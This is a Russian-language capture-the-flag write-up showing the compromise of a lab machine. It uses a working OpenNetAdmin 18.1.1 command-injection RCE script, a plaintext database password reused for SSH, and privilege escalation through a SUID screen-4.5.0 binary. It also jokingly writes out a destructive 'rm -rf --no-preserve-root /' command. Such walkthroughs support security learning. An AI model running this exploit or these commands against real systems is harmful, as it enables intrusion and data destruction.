# 1) Поиск скрытых файлов и каталогов

Используем [dirb](https://github.com/v0re/dirb) для поиска файлов и каталогов на сервере:

`$ dirb http://9215fc5b9c9d.ngrok.io `
Обнаруживаем директорию /ona/,переходим по ней и видем меню OpenNetAdmin.
Изучив главную страницу замечаем сообщение:
```
You are NOT on the latest release version
Your version    = v18.1.1
```
Теперь мы знаем,что на сервере стоит OpenNetAdmin версии 18.1.1.
# 2) Используем уязвимость в OpenNetAdmin
Ищем уязвимости на OpenNetAdmin 18.1.1,находим bash скрипт,который даёт нам RCE:
```
#!/bin/bash
URL="http://9215fc5b9c9d.ngrok.io/ona/"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' 
done
```
Используя RCE полученное ранее узнаём,от какого пользователя мы выполняем команды
```
$ whoami
www-data
```
Данный пользователь не обладает root правами поэтому ищем способ повышенния своих привелегий.

# 3) Ищем дырочки
Кроме нас есть пользователь `Andrew`, в которого очень хотелось бы войти ( ͡• ͜ʖ ͡• )

На гите чекаем [ona](https://github.com/opennetadmin/ona) и находим приколы, а именно как чё устанавливается [ona install.php](https://github.com/opennetadmin/ona/blob/master/install/install.php)

Нас интересует строка
```
$dbconfwrite = @is_writable($onabase.'/www/local/config/') ? 'Yes' : '<font color="red">No</font>';
```
Отсюда делаем вывод, что надо порыться в `/opt/ona/www/local/config` через наш шелл
```
ls -l /opt/ona/www/local/config
```
Видим содержимое:
```
database_settings.inc.php
motd.txt.example
```
Чекаем пхпышечку с помощью `cat`
```
cat /opt/ona/www/local/config/database_settings.inc.php
```
Вывод:
```
$  cat ./local/config/database_settings.inc.php   
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'mH1XDvt7I,&6',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
Вау-вау-вау приколы стоили рофляночки, мы тут видим пароль `mH1XDvt7I,&6`

Первое, что мы пробуем --- войти в нашего Andrew с этим паролем по ssh
```
ssh andrew@9215fc5b9c9d.ngrok.io -p 17408
```
А в поле для пароля пихаем `mH1XDvt7I,&6`, и мы вошли в нашего друга))

Друзья, вы очень юморные я сидел и хохотал

# 4) Обнаружение уязвимости для повышения прав пользователя
 
 Скачиваем на машину скрипт [LinEnum](https://github.com/rebootuser/LinEnum) - невероятно весёлый bash-скрипт, который собирает всю инфу, которая может позволить стать рутом и прописать заветное `rm -rf --no-preserve-root /`. 
 Скачиваем скрипт на машину с помощью [тулзы `wget`](https://www.gnu.org/software/wget/). Единственный аргумент здесь - адрес, с которого мы качаем ПрИкОлЬччИкИ =).
 
 ```
 $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-08-17 15:59:42--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.84.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.84.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                100%[===================================>]  45,54K  --.-KB/s    in 0,1s    

2020-08-17 15:59:43 (369 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
 ```
 
 Далее позволяем скрипту запускаться и запускаем, уводя вывод в какой-нибудь другой файл.
 ```
 $ chmod u+x LinEnum.sh
 $ ./LinEnum.sh > output
 ```
 
 Перекрестившись, открываем output и видим кучу строк кода. От незнания и чтобы сократить отчёт, допустим, что мы интуитивно открыли блок `SUID Files` и увидели в нём то, что мы можем запускать `/bin/screen-4.5.0` от рута. Приятно, что сказать.
 
 # 5) Эксплуатация уязвимости
 
 Находим [скрипт](https://www.exploit-db.com/exploits/41154), позволяющий успешно произвести эскалацию прав, копипастим его в отдельный файл .sh, позволяем запускаться и запускаем
 
 # Победа B)
 теперь вы рут и можете делать что хотите (в рамках закона и морали, но вот кстати вопрос: стоит ли следовать закону если всем подчиняющимся ему очевидна его бессмысленность и/или пагубное влияние?)
